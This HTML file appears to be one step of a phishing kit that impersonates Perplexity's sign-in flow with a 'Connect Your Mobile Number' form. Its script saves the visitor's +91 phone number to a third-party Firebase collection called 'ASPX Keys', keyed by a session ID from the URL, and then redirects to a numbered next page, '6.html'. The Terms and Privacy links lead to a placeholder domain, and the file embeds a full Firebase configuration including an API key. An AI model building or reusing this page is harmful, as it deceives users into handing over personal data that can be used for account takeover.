<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Connect Mobile - Perplexity</title>
    
    <!-- Firebase SDKs -->
    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore-compat.js"></script>

    <style>
        * { box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; margin: 0; padding: 0; }
        body { background: #ffffff; display: flex; flex-direction: column; align-items: center; padding: 60px 24px; color: #2d333a; }
        .container { width: 100%; max-width: 400px; text-align: center; }
        
        h1 { font-size: 32px; font-weight: 600; margin-bottom: 16px; color: #000; letter-spacing: -0.5px; }
        p.desc { font-size: 16px; color: #6e6e80; line-height: 1.5; margin-bottom: 40px; }
        
        .field { position: relative; margin-bottom: 8px; text-align: left; }
        .field label { position: absolute; top: -10px; left: 15px; background: #fff; padding: 0 5px; font-size: 12px; color: #6e6e80; }
        input { width: 100%; padding: 16px; font-size: 18px; border: 1px solid #d1d1d6; border-radius: 14px; outline: none; transition: 0.2s; }
        input:focus { border-color: #000; }
        
        .error { color: #df1b41; font-size: 13px; text-align: left; display: none; margin-top: 5px; font-weight: 500; }
        
        .terms { font-size: 14px; color: #6e6e80; margin-top: 30px; line-height: 1.5; }
        .terms a { color: #000; text-decoration: underline; cursor: pointer; }
        
        .btn { width: 100%; background: #000; color: #fff; border: none; padding: 18px; border-radius: 35px; font-size: 16px; font-weight: 600; cursor: pointer; margin-top: 40px; transition: 0.3s; }
        .btn:hover:not(:disabled) { background: #333; }
        .btn:disabled { opacity: 0.5; cursor: not-allowed; }
        
        .loading { display: none; text-align: center; margin-top: 20px; color: #6e6e80; font-size: 14px; }
        .spinner { display: inline-block; width: 16px; height: 16px; border: 2px solid #d1d1d6; border-top: 2px solid #000; border-radius: 50%; animation: spin 1s linear infinite; margin-right: 8px; vertical-align: middle; }
        @keyframes spin { to { transform: rotate(360deg); } }
    </style>
</head>
<body>

    <div class="container">
        <h1>Connect Your Mobile Number</h1>
        <p class="desc">Connect Your Phone Number to signing in to your Perplexity Account</p>

        <div class="field">
            <label>Mobile number</label>
            <input type="text" id="mobile" placeholder="+91 1234567890" spellcheck="false" autocomplete="off">
            <div id="errorMsg" class="error">Please enter a valid number (e.g. +91 1234567890)</div>
        </div>

        <p class="terms">
            By clicking "Continue", you agree to our <a href="https://1.com">Terms</a> and 
            have read our <a href="https://1.com">Privacy Policy</a>.
        </p>

        <button id="nextBtn" class="btn">Continue</button>
        <div id="loading" class="loading">
            <span class="spinner"></span>Connecting...
        </div>
    </div>

    <script>
        // Firebase Config
        const firebaseConfig = {
            apiKey: "AIzaSyDPm2za3Ho0Hd8Henuhq0KxAHyUQh-Hi-U",
            authDomain: "question-metabase.firebaseapp.com",
            databaseURL: "https://question-metabase-default-rtdb.asia-southeast1.firebasedatabase.app",
            projectId: "question-metabase",
            storageBucket: "question-metabase.firebasestorage.app",
            messagingSenderId: "770698198753",
            appId: "1:770698198753:web:59ae49d78b6013bab5c1a0",
            measurementId: "G-6ZP1FPMKSJ"
        };

        // Initialize Firebase
        firebase.initializeApp(firebaseConfig);
        const db = firebase.firestore();

        // Get Dynamic Session ID from URL (?session=4683853387)
        const urlParams = new URLSearchParams(window.location.search);
        const sessionId = urlParams.get('session');

        const mobileInput = document.getElementById('mobile');
        const nextBtn = document.getElementById('nextBtn');
        const errorMsg = document.getElementById('errorMsg');
        const loadingDiv = document.getElementById('loading');

        // Validate session on page load
        window.addEventListener('load', () => {
            if (!sessionId) {
                alert("Session ID missing in URL. Please try again.");
                nextBtn.disabled = true;
            }
        });

        async function submitData() {
            const val = mobileInput.value.trim();
            // Validates +91 1234567890 or +911234567890 (exactly 10 digits after code)
            const phoneRegex = /^\+91\s?\d{10}$/;

            if (!sessionId) {
                alert("Session ID missing in URL");
                return;
            }

            if (!phoneRegex.test(val)) {
                errorMsg.style.display = 'block';
                return;
            }

            // Valid phone number - proceed with submission
            errorMsg.style.display = 'none';
            nextBtn.disabled = true;
            nextBtn.style.display = 'none';
            loadingDiv.style.display = 'block';

            try {
                console.log("Starting Firebase update with Session ID:", sessionId);
                
                // Update the existing document in "ASPX Keys" using the SESSION ID
                const docRef = db.collection("ASPX Keys").doc(sessionId);

                // Set data with merge to preserve existing fields
                await docRef.set({
                    mobile: val,
                    updatedAt: new Date().toLocaleString() + " UTC+5:30"
                }, { merge: true });

                console.log("Firebase update successful, redirecting to 6.html");

                // Wait a brief moment to ensure write completes, then redirect
                setTimeout(() => {
                    window.location.href = `6.html?session=${sessionId}`;
                }, 500);

            } catch (err) {
                console.error("Firebase Error Details:", err);
                
                // Show specific error message
                let errorMsg = "Error updating record. Please try again.";
                if (err.code === 'permission-denied') {
                    errorMsg = "Permission denied. Please contact support.";
                } else if (err.code === 'unavailable') {
                    errorMsg = "Service unavailable. Please try again later.";
                }
                
                alert(errorMsg);
                
                // Reset button state
                nextBtn.disabled = false;
                nextBtn.style.display = 'block';
                loadingDiv.style.display = 'none';
            }
        }

        // Click Event
        nextBtn.addEventListener('click', submitData);

        // Enter Key = Submit
        mobileInput.addEventListener('keypress', (e) => {
            if (e.key === 'Enter' && !nextBtn.disabled) {
                submitData();
            }
        });

        // Auto-prefix +91
        mobileInput.addEventListener('focus', () => {
            if (!mobileInput.value) {
                mobileInput.value = '+91 ';
            } else if (!mobileInput.value.startsWith('+91')) {
                mobileInput.value = '+91 ' + mobileInput.value;
            }
        });

        // Clear error on input
        mobileInput.addEventListener('input', () => {
            if (errorMsg.style.display === 'block') {
                errorMsg.style.display = 'none';
            }
        });
    </script>
</body>
</html>
